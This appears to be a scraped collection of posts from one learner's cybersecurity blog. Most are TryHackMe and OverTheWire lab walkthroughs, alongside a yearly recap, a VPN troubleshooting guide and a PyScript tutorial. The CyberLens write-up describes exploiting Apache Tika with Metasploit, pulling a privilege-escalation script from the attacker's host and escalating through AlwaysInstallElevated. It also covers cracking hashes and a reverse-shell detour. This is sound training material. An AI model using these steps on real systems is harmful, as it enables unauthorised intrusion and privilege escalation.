[{"content":"Okay, it\u0026rsquo;s been a while. Last writeup on the blog was Chill Hack\u0026hellip; but she (and others) need refreshers.\nAnyway, here\u0026rsquo;s CyberLens, a newish TryHackMe room from Tyler Ramsbey who make\u0026rsquo;s great content, give them a follow/subscribe.\nPS - I\u0026rsquo;ve got a video walkthrough if you want.\nThe Challenge First up, the Challenge Description.\nWelcome to the clandestine world of CyberLens, where shadows dance amidst the digital domain and metadata reveals the secrets that lie concealed within every image. As you embark on this thrilling journey, prepare to unveil the hidden matrix of information that lurks beneath the surface, for here at CyberLens, we make metadata our playground.\rIn this labyrinthine realm of cyber security, we have mastered the arcane arts of digital forensics and image analysis. Armed with advanced techniques and cutting-edge tools, we delve into the very fabric of digital images, peeling back layers of information to expose the unseen stories they yearn to tell.\rPicture yourself as a modern-day investigator, equipped not only with technical prowess but also with a keen eye for detail. Our team of elite experts will guide you through the intricate paths of image analysis, where file structures and data patterns provide valuable insights into the origins and nature of digital artifacts.\rAt CyberLens, we believe that every pixel holds a story, and it is our mission to decipher those stories and extract the truth. Join us on this exciting adventure as we navigate the digital landscape and uncover the hidden narratives that await us at every turn.\rCan you exploit the CyberLens web server and discover the hidden flags? I thought this room might be more \u0026lsquo;image forensics\u0026rsquo; related, but I guess that\u0026rsquo;s just the law of this CyberLens company.\nTyler, is the description AI generated? It\u0026rsquo;s okay if it is, no shame, just curious.\n[UPDATE] Yes, it\u0026rsquo;s AI. Tyler mentions it in his Official Walkthrough.\nThere\u0026rsquo;s Things to Note which is nice.\nAdd the MACHINE_IP to /etc/hosts/ and wait 5 minutes. Done.\nBut the focus are two flags. 1) User, and 2) Administrator.\nA familiar room challenge.\nPerfect for me to get back into things.\nLet\u0026rsquo;s go.\nEnumeration Typically rustscan or nmap are normal starting points.\nBut since the description finished with \u0026ldquo;Can you exploit the CyberLens web server and discover the hidden flags?\u0026rdquo;\nIt\u0026rsquo;s easier to start on port 80 via cyberlens[.]thm.\nWith a quick look at WhatRuns and Wappalyzer, seems like an Apache Server running a basic html/css template on Bootstrap.\nAlso it\u0026rsquo;s on a Windows Server, good to know for later.\nNothing too interesting until scrolling down and seeing a form.\nAnd with a quick view-source, we\u0026rsquo;ve got an interesting end-point.\nSince the web form is fetching via \u0026lsquo;http\u0026rsquo;, perhaps we can see via the browser?\nAh, an Apache service with a version number. Interesting.\nSo, from searching Apache Tika it\u0026rsquo;s a toolkit (that) detects and extracts metadata from file types like PDFs etc.\nThis feeds into the CyberLens description from earlier.\nAnd from searching Apache Tika 1.17 Exploit we\u0026rsquo;ve got our in.\nSo it\u0026rsquo;s originally CVE-2018-1335 where a vulnerability \u0026ldquo;could be used to inject commands into the command line of the server running tika-server.\u0026rdquo;\nWe can also use searchsploit tika 1.17 if that\u0026rsquo;s your cup of tea.\nLooks like we have a Metasploit exploit ready to go, lovely.\nInitial Access Okay, let\u0026rsquo;s fire up this bad boy and see what we\u0026rsquo;ve got.\nUse msfconsole -q and then search tika to find our exploit.\nIt\u0026rsquo;s exploit/windows/http/apache_tika_jp2_jscript or type use 0 when it\u0026rsquo;s the first search item.\nSet the following options with set $option $value:\nset RHOSTS $MACHINE_IP set RPORT 61777 set LHOST $YOUR_IP And then use run or go when you\u0026rsquo;re ready.\nThe user flag hint Sometimes exploits take a few tries before they are successful ;) comes in here.\nYou may need to try this once or twice to get it working. Double check your options are correct.\nWhen the exploit works and a sessions created, you\u0026rsquo;ll see:\nWe\u0026rsquo;re in.\nSo who are we?\nA quick whoami and we\u0026rsquo;re user cyberlens.\nSince we\u0026rsquo;re in Meterpreter, there are extra luxuries, like:\nsysinfo for some system background. getsystem for a quick priv esc attempt\u0026hellip; no luck there. hashdump for a sneaky SAM database dump\u0026hellip; again, no luck. Worth a try.\nOtherwise, let\u0026rsquo;s look around. Do what the kids call \u0026lsquo;manual enumeration\u0026rsquo;.\nWe can drop a shell on the system using shell and then enter PowerShell with powershell.\nLet\u0026rsquo;s see some info about what we can do:\nwhoami /priv whoami /all If you\u0026rsquo;re like me, there\u0026rsquo;s a few rabbit holes to explore.\nWhat\u0026rsquo;s SeChangeNotifyPrivilege? Does it give me anything? After a quick Google, nope.\nLet\u0026rsquo;s look around then.\nSome good places to check are:\nC:\\ C:\\Users C:\\Windows\\Temp Since we\u0026rsquo;re in PowerShell, use ls or gci to list out contents.\n(Oh PowerShell, your commands are so simple to remember.)\nFor example, cd C:\\Users\\CyberLens and gci -recurse .\nInteresting, the user.txt, and a CyberLens-Management.txt\nAlright, now we have some credentials: CyberLens:H************3\nPrivilege Escalation I\u0026rsquo;ll be honest. I got stuck here, like really stuck.\nThe hint didn\u0026rsquo;t help RDP will make your life easier. If Remmina is not working, try this: rdesktop -u [user] -p [password] -N cyberlens.thm:3389.\nFor me, sticking with PowerShell was the way to go.\nBut after a few rabbit holes, I took a step back and watched Windows Privilege Escalation Guide.\nWhich led to a new (for me) script called PrivesCheck.\nIf you\u0026rsquo;re following along at home.\nStart a Python Web Server with python -m http.server 8000 where you download the script.\nThen on the Target Machine, put the script where you have write permissions. Like the Desktop or Temp.\nYou can use wget http://$YOUR_IP:8000/$file -UseBasicParsing -OutFile $file in PowerShell.\nGo ahead and run the script . .\\PrivescCheck.ps1; Invoke-PrivescCheck\nGotta say, I do like the output of PrivescCheck. An easy-to-digest summary is nice.\nSo what\u0026rsquo;s AlwaysInstallElevated?\nBasically, it allows lower level users to install Windows Packages with system level privileges.\nYou see where this is going?\nAnd luckily, HackTricks has more info about it.\nWould you look at that?\nThere\u0026rsquo;s another metasploit exploit ready to rock for us. Lovely.\nExit PowerShell and go back to Meterpreter with exit and exit.\nThen bg that session and type use exploit/windows/local/always_install_elevated.\nSet the options for the exploit and run:\nset LHOST $YOUR_IP set SESSION 1 And look at that, authority\\system user.\nIt\u0026rsquo;s as good as being root on Linux\u0026hellip; I think.\nThen cat C:\\Users\\Administrator\\Desktop\\admin.txt for the admin flag.\nReflection \u0026amp; Rabbit Holes CyberLens has been great, props to Tyler and TryHackMe.\nIt\u0026rsquo;s Easy rated, but the priv esc portion stumped me.\nI went down a few Rabbit Holes:\nRDP led me replacing C:\\Apache24\\bin\\httpd.exe with a reverse shell. Then using a startup.bat which using a Visual Basics script to run httpd.exe. I thought I found a Windows 17763 exploit on exploit.db\u0026hellip; nope. Then I followed Windows 11 Privilege Escalation via UAC Bypass (GUI based)\u0026hellip; again, nope. Since I have more Linux priv esc experience, this was a good room for me. I need to sharpen my Windows priv esc skills up, a lot.\nSome key takeaways:\nMetasploit makes things easier. It\u0026rsquo;d be good to do this room again without using it though. Push myself a bit. Research is king. I spent more time reading up about services and vulnerabilities. Even though I went down rabbit holes, I learned more. Stay calm and take breaks. I\u0026rsquo;ve rushed rooms to push content out in the past. Instead I took my time and just focused on learning. Thanks again to Tyler and TryHackMe.\nI\u0026rsquo;m already on my next room.\nSubscribe to the (not so) Monthly Monitor below.\nThanks for reading.\nPS - oh hey, you\u0026rsquo;re still here?

It\u0026rsquo;s been a long 12 months, yet it’s gone so fast. Here\u0026rsquo;s my 2022 recap plus my plans for 2023. Note, if interested see 2019, 2020 and 2021.\n~ Hi, my name’s Ash, I’m 27 and a cyber security enthusiast sharing my journey. You’ve received this newsletter as you subscribed via my website or downloaded a freebie. ~\nRead this newsletter online.\nOnline Teaching Wins It\u0026rsquo;s mid-2017, I’m 22 and it\u0026rsquo;s my first day on the job as an IT Tutor. I walk into an old classroom with 8 students looking at me ready for a lesson on project management. After months of prep, I open my generic PowerPoint on Gantt Charts and show Project Creep images I ripped off Google. I’m terrified but to my surprise, it goes well and I start enjoying it.\nFive years later I\u0026rsquo;m still teaching but now online and thankfully with no painful PowerPoints. It\u0026rsquo;s the first calendar year as a full-time online ****teacher, and it’s been amazing. I have increased job security, income stability, and better life quality with lowered stress. It\u0026rsquo;s a true blessing.\nI still miss my team back in the classroom and the students I made meaningful connections with. But I’m looking at ways to better connect with online students like video and live online sessions. I\u0026rsquo;ve always liked my job, but now I love it.\nYouTube Rises It\u0026rsquo;s the late 2000s, I\u0026rsquo;m in my mid-teens with my brother and we\u0026rsquo;re both over at his friend\u0026rsquo;s house. I see light beaming from an old boxy computer in the office while my brother and his friend are laughing. “You can type in anything and watch videos,” they said, so they type Dubai drifting followed by Jackass stunts which blew my teenage mind. So I ask “what do I search?” and they responded “I don\u0026rsquo;t know, fat people, falling or something”… yeah, that was my introduction to YouTube.\nNow 2022, YouTube isn\u0026rsquo;t recognisable to its 2000s counterpart. Sure the “fails” genre has stood the test of time, but it’s now a viable business opportunity for those people who share videos on what they love doing. It’s something that has always fascinated me.\nSo, this year I started uploading semi-regular videos to my channel documenting my journey as I learn Cyber Security. I’ve fallen in love with the video process and optimizing my content. It’s a growing set of skills, and not to mention how much I’ve improved over the year in Cyber Sec.\nIt\u0026rsquo;s been a great year, sure it hasn’t been a strong high-growth year for the channel or the website. But a good year for personal development and it\u0026rsquo;s all heading in the right direction. 2022 feels like the foundation the house is built on.\nQuarterly Catch-Up Jan, Feb, Mar: Started 2022 slow to focus on the new work role, oh plus I had a nice new custom PC. Then eased into creating content with a few videos and blog posts. Started the first year’s course, TryHackMe’s Beginner Learning Path which was a mammoth effort.\nApr, May, June: Began the fitness journey (again) while feeling burnt out with content creation. Started the year’s second course CS50P and reached the ripe old age of 27. Met my workmates in person and then built a few Python Projects.\nJuly, Aug, Sep: Got professional help dealing with negative thinking and took some time away on a short trip up north and saw the Great Barrier Reef. Then entered a coding competition and came 2nd before selling our car and simplifying our lives.\nOct, Nov, Dec: Started 100daysofctfs.com (and since forgotten about it), and published a ton of videos while completing TryHackMe’s Advent of Cyber. Got a remote personal trainer and have been at the gym 3-4 times per week while tracking nutrition, more focused than ever.\nShow The Stats Newsletter friends: 267 +200%\nYouTube subscribers: 995 +231%\nBlog views/visitors: 19,722 +38%, 11,762 +22%\nPlans For 2023 Vision Statement: I will be more consistent and confident in my life.

I\u0026rsquo;ll stay focused on my health and hit 3-4 weekly gym sessions while improving my nutrition.\nThanks to everyone in my life, my wife, friends, family, workmates and all you wonderful readers and viewers of my blog and channel.

A TryHackMe account. An OpenVPN config file via Network Access. Alright, so your there’s a few problems when trying to connect with OpenVPN to TryHackMe. Let’s cover them and learn how to fix connection problems in TryHackMe, let’s go.\nHow Do I Use OpenVPN On TryHackMe? First you need to have an active account with an OpenVPN config file generated and downloaded to your system. You can use any Operating System such as Windows, macOS or Linux with OpenVPN and TryHackMe. This guide will focus on using a Linux Virtual Machine within Windows, so let’s answer how to connect to OpenVPN?\nDownload your .ovpn config file via Network Access. Select generate, then download config file. Open terminal and run sudo openvpn path/to/\u0026lt;username\u0026gt;.ovpn, change path/to/ to actual path for example Downloads/hacker101.ovpn. After a few seconds, you should see ‘initialization sequence completed’. To confirm access, open a new tab in your terminal with CTRL + SHIFT + T, run ifconfig a To triple confirm, run ping 10.10.10.10 and check for a response back. This is TryHackMe’s server speifcally made for testing connections. And to quadiple check, go back to Network Access and refresh the OpenVPN Access Details section. Great, know you know the answer to ‘How Do I Use OpenVPN On TryHackMe?’ - I hope this has helped you. Continue readying for more information around questions such as ‘Do You Need a VPN For TryHackMe?’ and ‘Why Is TryHackMe Not Working?’\nAlso, sidenote, when you’re up and running, if you want run OpenVPN in the background, usesudo openvpn --daemon *.ovpn.\nDo You Need a VPN For TryHackMe? No, you don’t need a VPN for TryHackMe to play all rooms. But you do need a VPN for TryHackMe for rooms that include systems or Virtual Machines for you to interact with. It’s recommended to use a VPN for TryHackMe as you can then play any room as intended.\nSome rooms require downloading files and some open websites within the TryHackMe room. So again no, you don’t need a VPN for all TryHackMe rooms. However, if you can in a good habit of using TryHackMe’s VPN, then you can connect to any room.\nWhy Is TryHackMe Not Working? Start with TryHackMe’s OpenVpn Troubleshooting doc to gain a better idea of what’s not working. It could be openvpn not connecting, here’s a commands to try sudo ip link set dev tun0 mtu 1200.\nPrehaps your TryHackMe failed to connect to server, try visiting TryHackMe’s OpenVPN Troubleshooting Git Repo.\nwget https://raw.githubusercontent.com/tryhackme/openvpn-troubleshooting/master/thm-troubleshoot chmod +x thm-troubleshoot ./thm-troubleshoot If you’re still having issues, make sure you only have a single OpenVPN connection, use ifconfig to see your network adapters. OpenVPN will open a tunnel which looks like tun0 for example. If you see more adapters like tun1, tun2, then you want to pull those down.\nsudo ifconfig tun1 down Lastly, if you’re running OpenVPN and seeing an OPTIONS ERROR: failed to negotiate cipher with server error. Try running sed -i 's/cipher AES-256-CBC/data-ciphers AES-256-CBC/' *.ovpn in the directory of your ovpn config file.\n","permalink":"//localhost:1313/how-to-fix-tryhackme-vpn-not-working-troubleshooting-openvpn/","summary":"Is your TryHackMe OpenVPN not working?\nLet’s fix it, here’s what you’ll need:\nSome computer networking knowledge.

Technically, hashing takes arbitrary input and produce a fixed-length string…” — Daniel Miessler, Hashing vs. Encryption vs. Encoding vs. Obfuscation\nOkay, let’s get into this TryHackMe Crack The Hash room. There’s no more than a question, can you complete the level 1 tasks by cracking the hashes?\nTask 1.1 Fire up your Linux distro of choice and your preferred cracking tool. For me, I’ll start with John The Ripper, or john for short. To get started, have a quick refresher or catchup on john via tazusec.\nFeel free to copy each has from the room into a hash.txt either by echo '\u0026lt;hash\u0026gt;' \u0026gt; hash.txt, or by nano hash.txt and pasting it in.\nThe hash in question is as follows 48bb6e862e54f2a795ffc4e541caed4d, what a beaut!\nSo generally you can run john \u0026lt;format\u0026gt; \u0026lt;wordlist\u0026gt; \u0026lt;hash\u0026gt;, if you don’t know the format, john will try and guess for you. In this case, you can use the --format=RAW-MD5 format flag with the classic rockyou.txt file.\nTo determine hashes you can run your hash tool against it or use a hash tool like Hash Type Identifier. I think over time we’ll learn the differences between commonly used hashing and more effectively identify them ourselves. In due time my friend.\nIn this case, it’s an MD5 (message-digest algorithm), “a cryptographically broken but still widely used hash function producing a 128-bit hash value… it has been found to suffer from extensive vulnerabilities.” — Wikipedia, MD5\nSo yeah, don’t use MD5 in production or anywhere but to verify data integrity. I know WordPress used MD5 for a while, so it’s been around for a while.\nTask 1.2 Great, so for the next hash CBFDAC6008F9CAB4083784CBD1874F76618D2A97, mmhm, this one has a particularly nice ring to it. Run john \u0026lt;wordlist\u0026gt; hash.txt this time to let john do the heavy lifting.\nIt’s identified as the SHA-1 (Secure Hash Algorithm 1) hash type, “a cryptographically broken but still widely used hash function which takes an input and produces a 160-bit (20-byte) hash value” — Wikipedia, SHA-1.\nTask 1.3 Moving on, let’s crack 1C8BFE8F801D79745C4631D09FFF36C82AA37FC4CCE4FC946683D7B336B63032, we’ve got a big one boys.\nOkay, echo that sucker into your hash.txt and let’s get started. Running john \u0026lt;wordlist\u0026gt; hash.txt this time will give you a lot of suggestions, sometimes it’s a guessing game.\nBut after trial and error, the flag --format=RAW-SHA256 is a winner-winner chicken dinner.\nSo SHA256 is a part of the “SHA-2 family”, it’s “computed with eight 32-bit… words” and “used for authenticating Debian software packages” — Wikipedia, SHA-2. Good to know, we use SHA256 all the time on Linux, very cool.\nTask 1.4 Next up you’ve got $2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom as the hash, interesting. Due to the inclusion of special characters such as $, it’s easier to nano hash.txt and paste in the hash this time.\nFor more help, use Pentest Monkey’s John Hash Formats and Hashcat’s example_hashes.\nThere’s an extra step involved with this one, the hint says “this type of hash can take a very long time to crack, so either filter rockyou for four character words, or use a mask for four lowercase alphabetical characters.”\nLet’s take the advice and cat \u0026lt;wordlist\u0026gt; | grep -o -w '\\\\w\\\\{4\\\\}' \u0026lt;new-wordlist\u0026gt;, thanks to Stack Exchange for the guidance here. Once that’s good, as usual let’s john \u0026lt;new-wordlist\u0026gt; hash.txt and see if we get a match, and would you look at that? We got em.\nSo the hash is bcrypt, “a password-hashing function… based on the Blowfish cipher… in 1999” — Wikipedia, bcrypt. Looks like it’s a more sophisticated hash type by using random salts for more complexity, crazy stuff.\nTask 1.5 For the last hash in Task 1, let’s crack 279412f945939ba78ce0758d3fd83daa, a salty boy. And let’s switch up the cracking tool to hashcat.\nHonestly, this hash stopped me right in the tracks, so shoutout to LightOrithm for the help.\necho in the new hash, then run hashcat -m 900 hash.txt \u0026lt;wordlist\u0026gt; -r .../best64.rule, if you have another solution, feel free to reach out and let me know.\nTask 2.1 Task 2, dam long hash F09EDCB1FCEFC6DFB23DC3505A882655FF77375ED8AA2D1C13F640FCCC2D0C85, so echo \u0026lt;hash\u0026gt; \u0026gt; hash.txt and let’s crack it. The instructions state “You might have to start using hashcat here and not online tools. It might also be handy to look at some example hashes on hashcats page .”\nRun hashcat -a 0 -m 1400 hash.txt \u0026lt;wordlist\u0026gt; to crack this SAH256 hash.\nTask 2.2 Next up here’s hash 1DFECA0C002AE40B8619ECF94819CC1B, so echo \u0026lt;hash\u0026gt; \u0026gt; hash.txt and use Hash Type Identifier. There you’ll get NTLM, so search the hashcat’s example page, NTLM uses the code 1000.\nRun hashcat -a 0 -m 1000 hash.txt \u0026lt;wordlist\u0026gt; and you’ll see a cracked hash.\nTask 2.3 Alright, alright, alright, here’s some of the hash $6$aReallyHardSalt$6WKUTqzq...ZAs02. but it’s too long to paste here. Since the $ symbols, nano hash.txt but this time include a : and the salt after the hash. And 1800 is the code for hashcat, but be patient.\n“When using HashCat’s built-in SHA512Crypt module (1800), HashCat extracted the salt and the rounds from the hash and began cracking the password. Compared to other hashes this hash took longer to calculate each potential password, however eventually the password was cracked.” — cyber-99.co.uk\nTask 2.4 Okay, lucky last e5d8870e5bdd26602cab8dbe07a942c8669e56d6 hash, use code 4510 and you’ve got it.\nThis is days 56, 57and 58 of #100DaysOfHacking on the Hackers Learning Path.

Let’s CTF!!\nLevel 0 – Level 4 Level 0 Okay, let’s get started with Bandit Level 0 and connect to the game via Secure Socket Shell (SSH).\nThis tells Linux to run the ssh command, connect to bandit.labs.overthewire.org via port 2220 and user bandit0. So all together it looks like ssh bandit0@bandit.labs.overthewire.org -p 2220.\nThen, type yes and hit enter to complete the connection.\nTake a moment to read the rules and check out the welcome message.\nLevel 1 Okay, now put your game face on grunts.\nLet’s take a look at our goal. The password for the next level is stored in a file called readme located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH (on port 2220) to log into that level and continue the game.\nI like to copy/paste the goal into my note-taking app and highlight/bold areas that are important. In this case, we’ve got clear instructions to find the readme file.\nOkay, let’s look around the machine, find the file and then read it. We’ll use the ls command to view files in the current directory. Then we’ll cat the file we find.\nGreat! We got it! I know it’s a random bunch of letters and numbers but in this CTF the “flags” will look like this. Other games might be a bit different, but this unreadable nonsense is a good thing!\nDon’t forget to copy that flag by highlighting it and pressing CTRL + SHIFT + C.\nLet’s confirm this is correct by cutting the connection via bandit0 user and ssh into the next level via bandit1. We’ll do that by running the command exit.\nNow instead of typing or copying/pasting the ssh credentials, let’s use the up arrow to find our last command. Edit the command to make it more usable moving forward. Remove bandit0@ in the beginning and add -l bandit1. All together, it looks like ssh bandit.labs.overthewire.org -p2220 -l bandit1\nNow paste the flag using CTRL + SHIFT + V which you can copy from your notes because you’re definitely taking notes, right??? Done with Bandit Level 1, so move on to the next level.\nLevel 2 Alrighty, now it’s getting serious with Bandit Level 2. First things first, let’s read that goal. The password for the next level is stored in a file called – located in the home directory\nOkay, seems easy, same as last round, ls then cat…right?\nTry it, but you’ll see the issue. We need to specify the exact file path in order for Linux to understand. We’ll add ./ which tells Linux “hey, I’m in this folder”.\nThat looks pretty good, so let’s follow the same process of exit \u0026gt; up \u0026gt; change user, in this case, bandit2 \u0026gt; and paste the flag as the password.\nLevel 3 Training wheels are off, quick goal check. The password for the next level is stored in a file called spaces in this filename located in the home directory.\nOkay, hm, a bit unusal. This shouldn’t be too difficult… shouldn’t be.\nIf we try and cat out to see the file, but type out spaces in this filename it treats each word as a separate file. How do we fix this?\nAfter a bit of googling… it’s quite easy. Just add a \\ after each word. But to make it easier, hit TAB after typing the first letter s and it’ll do it for you!\nFlag, got, nice, thanks Bandit Level 3. Now get out of this level and move on to the next one.\nLevel 4 Let’s go beyond ls and cat and start changing the directory (aka folders).\nSo what’s the goal? The password for the next level is stored in a hidden file in the inhere directory.\nOkay, our clue is the directory is hidden, tuck that away for now. Let’s view what’s around and move into our directory using cd. You might notice I’m using \u0026amp;\u0026amp; to chain commands together, a neat little trick I’ve picked up. So try cd inhere \u0026amp;\u0026amp; ls and we should see our file but it’s hidden.\nWe need to introduce flags, these are like switches we can use to add features to our programs.\nls displays files, but if we turn on -a it will also display hidden files. Let’s try it!\nNice! We got the flag for Bandit Level 4, nice. Now let’s exit and move on to the next level in Bandit Levels 5 to 9.\nThanks for reading and I hope you learned something from this little exercise.

We’ve got a lot of directories to search through now…\nHmm, there must be a better option to automatically search these folders! Enter the find command, with it we can search multiple directories and pass it certain switches to narrow down our results, let’s test it out.\n$ find . This runs find in the current directory, that’s what the . is for.\nWe can be more specific and use switches like -type or -size to find exactly what we’re looking for.\nLet’s go back and get a clue from Bandit Level 5 → Level 6:\nThe password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties:\nhuman-readable 1033 bytes in size not executable\nOkay, so we’ve got some hints for what file we’re trying to find. Let’s use the -size switch with the byte size and see what we get.\n$ find . -size 1033 That’s weird, no luck! That’s because we need to specify what file size exactly, 1033 is just a number. Let’s search it up!\nThanks to linuxconfig.org we know we need to use c for bytes.\n*Don’t forget to use the up arrow to see last command!\n$ find . -size 1033c ./maybehere07/.file2 Cool, look at that! Now we have only one search result, let’s see if we can cat it out and view it.\n$ cat ./maybehere07/.file2 banditflag5-6{*****} We got it! Now exit out and let’s go again!\n*Since my first few writeups I’ve learnt sharing flag’s isn’t the best idea as it allows anyone to simply copy/paste their way through without trying or trying.\nLevel 7 Let’s jump into the next one head first and see what we get!\n$ ls -la Okay, strange, nothing there. Maybe I should read the goal first after all!\nThe password for the next level is stored somewhere on the server and has all of the following properties:\nowned by user bandit7 owned by group bandit6 33 bytes in size\nAh, so the file isn’t within the bandit6 directory, it’s somewhere else. No worries, let’s look up how to use the find command to get the right switches.\n$ find --help After looking a bit at the wall text, I see -user NAME and -group NAME, I think they’re what we’re after. We’ll use it with -size from the last level too.\n$ find -user bandit7 -group bandit6 -size 33c No luck! What did we forget?\nThe location! Currently, we haven’t specified where to look, remember it’s hidden anywhere on the server.\n$ find / -user bandit7 -group bandit6 -size 33c Good, it’s working! Bad there’s so many files we don’t have access to, how do we only see accessible files? One way is to remove the errors, as ‘Permission denied’ is an error, we can redirect those results elsewhere.\nThanks to cyberciti.biz for explaining stdin, stdout and stderr, it’s worth reading over that aritcle to understand more.\n$ find / -user bandit7 -group bandit6 -size 33c **2\u0026gt;/dev/null** /var/lib/dpkg/info/bandit7.password How cool? We got one search result, that makes life a lot easier.\nThe 2\u0026gt;/dev/null may seem very strange at first. The 2 stands for stderr which is the errors we have as a result of our search. The \u0026gt; redirects and the /dev/null is a nothing space directory we can dump everything.\nSo, cat that sucker and grab your flag!\n$ cat /var/lib/dpkg/info/bandit7.password banditflag6-7{*****} Level 8 Let’s not read the instructions just yet! ls away my friends!\nAh, a simple data.txt file, this seems too easy to be real.\nLet’s cat and …oh gosh… so much data, so much!\nHm, maybe we’ll go back to the hints now:\nThe password for the next level is stored in the file data.txt next to the word millionth.\nOkay, so we need to somehow search within the file and output the flag. Our only hint we have is it’s next to the word millionth.\ngrep is the command for the job, it searches for patterns in a file.\nLet’s run grep --help to get familiar with it, we’re looking for a switch that’s simple enough to match our word with it. Let’s try -e or -regexp=PATTERN, that should do it!\n$ grep data.txt -e millionth banditflag7-8{*****} Would you look at what we have here… a flag!\nLet’s exit out and head over the next level!\nLevel 9 Same as always, ls and see what we’re working with.\nLooks like another data.txt file with even more ‘hard to read’ text.\nBack to the instructions:\nThe password for the next level is stored in the file data.txt and is the only line of text that occurs only once.\nWe could use grep and put together a long regex to output what we need, but I’m not a wizard.. so we’ll be using sort and uniq.\nFirst, let’s understand sort it’s similar to cat but run it against the data.txt and see the difference.\n$ sort data.txt Everything is sorted, cool.\nBut how do we then find the unique flag? uniq of course.\nTry it:\n$ uniq data.txt Hm, that didn’t work… that’s because we need to use them together. Since they’re separate commands, we’ll use the | pipe to chain it together.\n$ sort data.txt | uniq Still no luck, let’s run uniq --help and see if there’s a switch that can help.\nYep! -u which only prints unique lines, that sounds perfect!\n$ sort data.txt | uniq - u banditflag8-9{*****} Done! We got there thanks to stackoverflow.\nLevel 10 Our final level together, for now, let’s ls this thing.\nAnother data.txt file, let’s cat it.\nAh heck, it was a trap! Use clear and we’ll go back to the instructions:\nThe password for the next level is stored in the file data.txt in one of the few human-readable strings, preceded by several ‘=’ characters.\nOkay, so we need to search through the file and somehow use =… let’s give it a shot! Maybe we’ll try grep again from the earlier level.\n$ grep data.txt -e = Binary file data.txt matches StackExchange shows us that since the data.txt file starts with non-text, it treats it as binary and therefore won’t search it. Dam.\nLet’s look at the other commands we can use.\nThere’s one called strings, let’s take a closer look with strings --help\nIf we use this commands and | pipe grep with a few = … we should be good to go, let’s try it!\n$ strings data.txt | grep === ========== the*2i\u0026#34;4 ========== password Z)========== is \u0026amp;========== banditflag9-10{*****} It’s not the prettiest method, it’s probably not the best way either, but it worked!\nThanks for reading along with my bandit CTF journey!

There’s a lot of new coders asking questions about Python, JavaScript and so on. But the event channel caught my eye, for the month of July there’s a Summer Event. All I have to do is make an open-source app and submit it.\nLucky for me I just finished CS50P and started a small series of web apps. I tried smaller scripts like Cowsays What CTF, but nothing that felt like an app. Basically, I want to build something that solves a problem.\nFirst was Mailto Me which is a way to automate templates within a link, it’s something that we needed at work. Then LightShot Leaks was less about solving a problem and more about shedding light on a privacy issue. But then I made I Was There which actually does solve a big issue in education, easily generated event certificates.\n‘I Was There’ became my submission which landed me in second place. I won 3 free courses including Python, PHP and JavaScript exams to get certified, plus 6 months of their premium service.\nThe takeaway, competitions are awesome and you should enter more.\nI’ve never got involved in time-based comps, but now I’m looking at live cyber-based CTFs. I’d love to win some prizes to get certified in pen testing and who knows what else!\nCatch-Up Months Memories\nWe got away on a holiday in North Queensland. I highly recommend Port Douglass, Mossman Gorge, Green Island and Skyrail/Train around Cairns. Sold my car, and now my wife and I are down to a single mode of transportation… a mid-sized SUV to fit the imaginary kids. My wife and I are working on our morning routine which involves getting up earlier, walking together and focusing on our shared mental health. It’s been really nice forming better habits together. Struggled with video game addiction again and ended up uninstalling one problematic game. Sometimes cutting off a bad habit is the only way forward.

You’ll enable PyScript, take user data, run it through your program and print it back out to the user.\nYou’re learning the basics of building front-end, browser-based web applications. With minimal setup, it’s all about your imaginations limitation. Follow the steps below to complete the project, enjoy and we hope you learn a lot!\nGoals\nHTML page w/ Bulma CSS Framework Use PyScript to create a Python program Produce a complete, simple web app HTML page w/ Bulma CSS Framework HTML Structure Okay, let’s start with a basic html structured page, and save it in index.html.\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=edge\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; ... \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; CSS + Meta Links Great, next we’ll be using some css files over the air via a CDN (Content Distribution Network). Make sure to include these in-between \u0026lt;head\u0026gt;\u0026lt;/head\u0026gt; tags.\n\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;\u0026lt;https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css\u0026gt;\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;\u0026lt;https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css\u0026gt;\u0026#34;/\u0026gt; While we’re adding links, let’s take a look at what’s going to help out later, PyScript. Currently, it shows the following links, but bare in mind these will change in the future so check their website.\n\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;\u0026lt;https://pyscript.net/alpha/pyscript.css\u0026gt;\u0026#34;/\u0026gt; \u0026lt;script defer src=\u0026#34;\u0026lt;https://pyscript.net/alpha/pyscript.js\u0026gt;\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; Complete Layout Awesome, now it’s time to set up the full page structure, from here on out the html code will be in shorthand for you to write yourself. Keep in mind this all goes within the \u0026lt;body\u0026gt;\u0026lt;/body\u0026gt; tags. Here’s the html outline for you to create, notice the indention.\nNote, . (dots) are classes, # (hashtags) are IDs, for example section.container would be \u0026lt;section class=\u0026quot;container\u0026quot;\u0026gt;\u0026lt;/section\u0026gt; and label#name would be \u0026lt;label id=\u0026quot;name\u0026quot;\u0026gt;\u0026lt;/label\u0026gt;. If you’ve used Emmet, this will be familiar. If not, don’t worry, you can pick it up as you go.\nsection.container section.notification h1.title label input#name.textarea label input#email.textarea button#convert.button section.notification div#output pyscript To explain, you’re setting up a primary section with two sub-sections. The first section will have the titles, labels and inputs. And the second section will display the outputs after PyScript has had it’s fun.\nUse PyScript to create a Python program Alright, now we’re getting into the weeds… I mean, fun stuff, because it is a lot of fun. The links we added in earlier are going to allow us to use Python in the browser, how cool? Yep, just HTML and Python, crazy!\nThe PyScript HTML Tag Let’s start by adding the PyScipt specific syntax to see it in action and get a taste for it all. Under your \u0026lt;button\u0026gt;\u0026lt;/button\u0026gt; tags inside index.html, add \u0026lt;py-script\u0026gt;\u0026lt;/py-script\u0026gt;. This is one of a few new PyScript syntaxes brought into HTML. Inside the tags, write print('Hello world') the infamous right of passage in coding. Run your code and walla, you have Python in 